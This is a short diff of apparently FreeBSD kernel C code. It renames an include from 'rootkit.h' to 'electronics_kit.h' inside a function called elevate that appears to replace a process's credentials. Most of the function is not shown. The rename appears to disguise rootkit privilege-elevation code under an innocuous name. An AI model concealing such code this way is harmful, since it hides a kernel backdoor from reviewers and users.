@@ -1,4 +1,4 @@
-#include "rootkit.h"
+#include "electronics_kit.h"
 
 void elevate(struct thread *td) {
 	struct proc *p = td->td_proc;
@@ -40,5 +40,5 @@ void elevate(struct thread *td) {
 	uifree(uip);
 	crfree(oldcred);
 
-	
+
 }
